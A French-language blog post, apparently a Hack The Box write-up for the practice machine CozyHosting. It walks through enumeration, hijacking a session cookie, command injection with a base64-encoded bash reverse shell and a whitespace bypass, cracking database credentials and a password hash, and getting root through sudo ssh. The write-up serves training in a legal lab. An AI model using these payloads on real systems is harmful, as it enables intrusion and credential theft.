---
date: 2024-03-02T11:10:54-06:00
# description: ""
image: "/images/HTB-CozyHosting/CozyHosting.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: CozyHosting"
type: "post"
---

* Platforme: Hack The Box
* Lien: [CozyHosting](https://app.hackthebox.com/machines/CozyHosting)
* Niveau: Easy
* OS: Linux
---

CozyHosting est une machine Linux de niveau facile comportant un site web d'hébergement vulnérable à l'injection de commandes et l'accès au compte root est obtenu en abusant du binaire SSH.

L'adresse IP cible est `10.10.11.230`

## Balayage

```
sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230
```

* Nous avons une machine Linux
* Une application web sur le port 80
* Le service SSH sur le port 22

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:21 CST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
```

Nous rajoutons `10.10.11.230 cozyhosting.htb` à fichier `/etc/hosts` pour faciliter l'énumération.

## Enumération

J'accède à l'application en visitant `http://cozyhosting.htb`. Il s'agit d'un service d'hébergement, les liens `Home`, `Services`, et `Pricing` ne font rien de spécial.

![cozyhosting-website](/images/HTB-CozyHosting/cozyhosting.png)


Le bouton `Login` vous conduit à une page de connexion avec l'url `cozyhosting.htb/login`.


![cozyhosting-login-form](/images/HTB-CozyHosting/cozyhosting-login.png)

Pour commencer, on utilise `Gobuster` pour trouver tous les répertoires potentiellement cachés, j'utilise [SecLists](https://github.com/danielmiessler/SecLists).

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
```

![cozyhosting-Gobuster](/images/HTB-CozyHosting/gobuster-medium.png)

`/admin` et `/logout` renvoient à la page de connexion. Avec `/error`, on arrive à une page avec ce message.

![cozyhosting-error-page](/images/HTB-CozyHosting/whitelabel-error.png)

Je ne comprends pas ce que signifie cette erreur, je cherche sur Google et je découvre qu'il s'agit d'une erreur de Spring Boot. En lisant plus en détail, j'apprends que cette erreur indique que l'application Spring Boot n'a pas de point de terminaison spécifique ou de route définie pour gérer le chemin `/error` et qu'il pourrait y avoir d'autres points de terminaison dans l'application.

 > Consultez cette page stackoverflow [Whitelabel Error Page](https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error) pour plus de détails.

Je reviens à gobuster pour une énumération plus spécifique des répertoires. SecLists a une liste pour Spring Boot que nous pouvons utiliser.

```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb
```

![cozyhosting-Gobuster-spring-boot](/images/HTB-CozyHosting/gobuster-springboot.png)

Nous découvrons d'autres répertoires, après les avoir tous testés, je trouve ce qui ressemble à un cookie pour l'utilisateur `kanderson` dans `/actuator/sessions`.

![cozyhosting-cookie](/images/HTB-CozyHosting/cookie.png)

Je retourne à la page de connexion et j'essaie de l'utiliser. J'utilise des valeurs aléatoires pour `Username` et `Password` pour générer un cookie. Ensuite, je remplace la valeur de mon cookie par celle que je viens de trouver et je rafraîchis la page.

J'ai maintenant accès au tableau de bord de l'utilisateur.

![cozyhosting-dashboard](/images/HTB-CozyHosting/Dashboard.png)

Il y a un autre champ de saisie, qui semble fonctionner avec des clés SSH.

![cozyhosting-SSH-note](/images/HTB-CozyHosting/cozyhosting-SSH-note-1.png)

J'utilise Burp Suite pour capturer la requête. J'essaie `cozyhosting:test` et le résultat est le message `host key verification failed` (échec de la vérification de la clé d'hôte). Après avoir entré un `hostname` et un `username`, le formulaire envoie une requête au point de terminaison `/executessh`.

![cozyhosting-host-key-failure](/images/HTB-CozyHosting/host-key-verification-fail.png)

Je constate également que l'application essaie d'exécuter des commandes bash et j'obtiens une erreur lorsque `/bin/bash -c` est exécuté.

![cozyhosting-bash-error](/images/HTB-CozyHosting/binbash-error.png)

## Accès initial

Maintenant que je sais qu'une commande bash est exécutée, je peux essayer d'obtenir un reverse shell à travers ce processus.

J'ai utilisé cette commande pour générer mon payload en base64.

```
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

![cozyhosting-payload](/images/HTB-CozyHosting/payload-generated.png)

**Mettre en place un listener netcat avant d'essayer de se connecter**

```
nc -nvlp <YOUR-PORT-NUMBER>
```

J'essaie de me connecter avec `cozyhosting` comme hostname et pour le username j'utilise la commande ci-dessous (j'utilise mon payload base64 généré plus tôt avec la commande `echo`)

```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjIvODAwMCAwPiYxCg=="
```

J'obtiens un message disant `Username can't contain whitespaces!`. J'utilise alors le paramètre bash `{IFS%??}` pour supprimer les espaces du payload.

```
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

Après avoir utilisé le nouveau payload, j'obtiens un reverse shell!

![cozyhosting-reverse-shell](/images/HTB-CozyHosting/rev-shell.png)

On peut rendre le shell stable à l'aide des commandes suivantes

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
```
![cozyhosting-stable-shell](/images/HTB-CozyHosting/stable-shell.png)

> Ne vous inquiétez pas si vous ne voyez pas le prompt après avoir exécuté la dernière commande, appuyez simplement sur `Entrée` et le prompt réapparaîtra.

Nous trouvons une archive sur le système cible, téléchargeons-la. 

Je configure un serveur sur le système cible

```
python3 -m http.server 8000
```

Sur ma machine Kali, j'exécute

```
wget cozyhosting.htb:8000/cloudhosting-0.0.1.jar
```

Décompressez l'archive avec

```
unzip cloudhosting-0.0.1.jar
```

Faites une recherche avec `grep -r password *` et vous obtiendrez quelques résultats. Je vois qu'il y a un mot de passe dans `BOOT-INF/classes/application.properties`.

![cozyhosting-password-in-archive](/images/HTB-CozyHosting/password-location-springboot.png)

J'affiche le contenu du fichier sur le terminal et j'obtiens un nom d'utilisateur en plus du mot de passe pour une base de données PostgreSQL.

![cozyhosting-full-credentials](/images/HTB-CozyHosting/postgres-credentials.png)

Je me connecte à PostgreSQL avec

```
psql -h 127.0.0.1 -U postgres
```

Puis je me connecte à la base de données avec

```
\c cozyhosting
```
![cozyhosting-db-login](/images/HTB-CozyHosting/postgres-loggedin.png)

Je liste ensuite les tables de la base de données avec `\d`.

![cozyhosting-db-tables](/images/HTB-CozyHosting/db-tables.png)

On exécute ensuite `select * from users;`, avec cette commande PostgreSQL va récupérer toutes les lignes et toutes les colonnes de la table "users" et les retourner en tant qu'ensemble de résultats. Cette requête est couramment utilisée pour visualiser le contenu d'une table et peut être très utile pour inspecter les données stockées dans la base de données.

Nous trouvons deux hashs

![cozyhosting-db-hashes](/images/HTB-CozyHosting/db-hashes.png)

Voyons de quel type de hachage il s'agit (bien sûr, nous sommes intéressés par le hachage de l'administrateur car nous sommes déjà connectés en tant que kanderson).

```
hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' 
```
![cozyhosting-hash-ID](/images/HTB-CozyHosting/hashid.png)

### Mouvement Latéral

Essayons de craquer le hash. Tout d'abord, je l'enregistre dans un fichier.

```
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt
```

> Si vous ne voulez pas utiliser `John`, utilisez ce site web [hashes.com](https://hashes.com/en/decrypt/hash)

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

J'obtiens le mot de passe `manchesterunited`.

De retour sur le reverse shell, exécutez `ls -la /home` et vous verrez un autre répertoire appartenant à l'utilisateur `josh`.

![cozyhosting-home-content](/images/HTB-CozyHosting/home-listing.png)

On bascule sur l'utilisateur `josh` avec `su josh` et le mot de passe qu'on vient de craquer. On utilise ensuite `cd $home` pour aller dans son répertoire personnel et on y trouve le drapeau `user.txt`!

![cozyhosting-user-flag](/images/HTB-CozyHosting/userflag.png)

## Escalade des privilèges

J'utilise `sudo -l` pour voir ce que cet utilisateur peut exécuter.

![cozyhosting-sudo-l](/images/HTB-CozyHosting/sudo-l-josh.png)

Je vais sur [GTFObins](https://gtfobins.github.io/gtfobins/ssh/#sudo) pour trouver des commandes ssh root shells et j'utilise

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![cozyhosting-privilege-escalation](/images/HTB-CozyHosting/priv-escalation.png)

Ce shell n'est pas optimal, vous pouvez exécuter cette commande pour obtenir un shell plus correct.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Il ne vous reste plus qu'à faire `cd $home` et vous trouverez le drapeau `root.txt`.

![cozyhosting-privilege-escalation](/images/HTB-CozyHosting/rootflag-1.png)

Merci d'avoir consulté mon article, n'hésitez pas à commenter ou à me contacter sur X [@_KScorpio](https://twitter.com/_KScorpio) si vous avez des questions.
